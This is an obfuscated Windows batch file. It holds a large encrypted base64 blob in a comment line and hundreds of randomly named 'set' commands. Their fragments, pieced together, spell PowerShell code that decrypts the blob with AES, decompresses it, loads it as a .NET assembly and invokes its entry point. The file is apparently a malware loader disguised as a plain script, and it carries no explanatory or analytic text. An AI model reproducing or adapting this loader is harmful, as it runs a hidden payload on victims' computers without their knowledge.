@echo off
:: 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
set "XQKSxMTVck=Po"
set "MHAcehQCnL=rs"
set "nhdRkgOsMM=po"
set "IdcsKwnaQd=he"
set "SehHXDrwlO=ws"
set "WWZxxDbzST=Sy"
set "hKduxPmAxG=0\"
set "lUEwdFmVWn=:\"
set "DojbErhpcF=in"
set "GreIapKZhr=Wi"
set "wQWAeeZhUA=co"
set "cxPMMnmZym=ll"
set "WtIgzCiCZO=s\"
set "kyYfTFHbMd=.e"
set "RUWLBVDAYY=\v"
set "bdWHCmUUML=32"
set "aGnsxGUjcM=\W"
set "PGJXYGtFkw= %~dp0"
set "ItyeqrQcOR=cd"
set "YSCdUXsSrS=form"
set "NLvYAskLlS=yYiW"
set "BCdQaixECo=gjYA"
set "GLQOvCIHPT='')("
set "XHvDmjujPS=flec"
set "zdKkVrJXCk=IjUE"
set "bYXVTCttHq=ct S"
set "lkSqzfrUNk=6] -"
set "OvPUMnDqVb=e]::"
set "TZmbWDuwRr=]::("
set "IgosALDQLm=.Mem"
set "fKGOWGfAjx=em.I"
set "oVZhJyDTXb=e = "
set "pTukuHjHTh=::De"
set "IaJUoTQMum=ss -"
set "IjcQUYynZR=ltXe"
set "bbTcoUSTmJ=oArr"
set "xSYxmeTkzH=);$A"
set "opYRIFgIwC=orF'"
set "DUIoTDsyFV=.Len"
set "KASmzautNX=eMVs"
set "MgJowaaYHa=ew-O"
set "lLZcycHmAd=-nop"
set "xYdoLyOpKC=-joi"
set "CttNwYKgxn=)))"
set "lTWXWoTSAQ= [Sy"
set "yPGiSvGBKL=gth)"
set "rcmLhhfuoz=);$w"
set "CxdAqBupWo=m.Re"
set "tDOaTnEftG=br ="
set "HhQmOKbSzw=ptor"
set "BxPouFztkx=A.En"
set "RijXvaUZdT=jvbr"
set "dNEfzbPbIe=  $o"
set "YVFQHsNtoY=comm"
set "HdOoXdryxG=CFxo"
set "TMxoRwXtho=-Obj"
set "jPYtvhgZeJ=iron"
set "gUnPDvrmiS=S46e"
set "pIlkRagJLw=pher"
set "zYHgBygsgt=mky."
set "QHEGxcyIsS=ypto"
set "KoRLcPkQaw=.Com"
set "QQDQKWJWFc=ress"
set "tJEiRzuOrO=Comp"
set "YgEwsWepii=.Mod"
set "hSXAgKxBpa=tem."
set "mDCigxJpeT= if "
set "JSafQZrREN= = $"
set "KJjGIUuMjc=se()"
set "tHJdwlfwVz=ptog"
set "owGkABjVhR=F'[-"
set "mDsnqNAdvU=morF"
set "itJfloELDL=BC;$"
set "ZrEUuVMXhG=YxVw"
set "wYBzwPuoBy=]::C"
set "hSiLBjOcQr=M, 0"
set "lNkfQERSGn=tryP"
set "RrrhwESXyY=y.Cr"
set "ocdfooFfFl=ing("
set "IicBfTotjW=)) {"
set "koAmKJlxaJ=L4Yi"
set "kzLarrTZcp=em.C"
set "CMawtlNaMn=.Cre"
set "ZBCmCWEzsM=saBm"
set "lrfELCJLxv=n ''"
set "BaJUMwtQJM=gnir"
set "IqRWTcIfgn=yste"
set "RdYfuwZLgZ=rweZ"
set "jmXsUcVExl=Vz, "
set "xFDpjtHEUX=.IO."
set "OVJHnuedpl=Mode"
set "oIQFdieTDJ=oin "
set "ohcAZRXAyv=yOz."
set "WHJBiLSQnb=n ''"
set "miGLmjZvyx=zHhH"
set "hkiMDNESyg=sKGL"
set "dOdAmDWDga=lBlo"
set "VEVnHvWJXA=m(, "
set "SXtBRXvZwY=.Cry"
set "bGOhokPmCH=z.Su"
set "jHpzeJaOBM=eam("
set "WQndxeAcjo=th('"
set "oRADizHPBu=Comp"
set "sKZUOfINMH=okA "
set "TvugoGBDWA=LM ="
set "vysQYxDjHA=rweZ"
set "zEzdejKgzD=7;$s"
set "nSSVMyJdcI=ltXe"
set "gCMUvsGsZJ=iW.D"
set "EVoCcmTHUt=File"
set "YhGlVaaFOW=esMa"
set "akNuuRNPXD=..-1"
set "bwHsleifPc=Fina"
set "kBaccPqXSv=in $"
set "BegvNPtzkW=null"
set "qOhvKSHkIK=.Dis"
set "fuzuQDkjZn=pk.T"
set "uncvKzCyUq=tem."
set "zIAGGoXdOC=M = "
set "NxIanlqwbc=l5E7"
set "PQwJJTpSJD=[-1."
set "wZOkkpfjbw=-4] "
set "jDIpSkhmgf=, (,"
set "uZUHCOmafw= [st"
set "JQRwVqhMOc=e.Pa"
set "yJnzhCZjgP=yhPV"
set "iKPAskWLPC= = ["
set "bxFqBBVDyr=br);"
set "okxnVxtAqm='[-1"
set "LlTSrAowVe=ltXe"
set "nurVfYfFKR=yOz "
set "RcsGZbLfAg=ecry"
set "OjYirMSpmj=ert]"
set "HFllZQwlDl=urit"
set "RsEADGXnRM=X) {"
set "JKidYkpUdX=tS46"
set "AmNqvoehSY=onve"
set "wBjhfnSwzT=ck($"
set "ZkRfvZWGTd=ewLi"
set "TknmYfJfWb=16] "
set "khqfSnTBEu=RmAx"
set "ksLdqtyYMd=$Tkr"
set "OIbvTHtPjy=y]::"
set "JYjCrwvVoP=$wjv"
set "uEqXypmgil=rity"
set "YgFjtykgTI=1] -"
set "ZzgKgMoYSX=TllA"
set "AkSBRFfDOs=ring"
set "qdWHmAuuwr=sKGL"
set "lbybUKyBIW=.Cry"
set "PFsrNoXqZJ=EX ="
set "lgetivgveX=y.Pa"
set "HuSIqdOjVt=tsWi"
set "TODuFjKhZN=($eA"
set "LwkPtURhBL=zuZI"
set "tJTynhLdQh=[Sys"
set "rZSNKOJmAB=();$"
set "GtxLhzrAUR=Conv"
set "fsUmIleLHJ=le  "
set "YAjqnKukLy=brea"
set "nSNwOghxxS=rpk."
set "ucaSxtDJUo=1..-"
set "ugWyLAaahW=$sKG"
set "gBPaBfLLJx=$wjv"
set "ewfVlCDcsD=ct S"
set "nDWuUDgyYW=daeR"
set "GzOXFvmlSP=;$Tk"
set "UcPweWkJui=.Cop"
set "XyDuTWVqFf=();$"
set "CasvpWrlkN=ment"
set "PGdTvsyMdf=am;$"
set "rOTLfMSxpx=nage"
set "XTLMoIWanT=s75K"
set "CPhySzrsxQ=rt]:"
set "FItViLRyRP=gsYZ"
set "fPRqgjpAcj=.Con"
set "qTzeqmexhH=]::("
set "XQWvMJozZj=raph"
set "JKLHbeYVzE=ke($"
set "CHzcEMeeFX=embl"
set "wOpCmmkkAn=ateD"
set "UJXfOUvyUk==');"
set "pHvhWpXXOF=rans"
set "oudqLSIEhM= = N"
set "PRBQmakcVM=[Sys"
set "boiWKsinaq=ach "
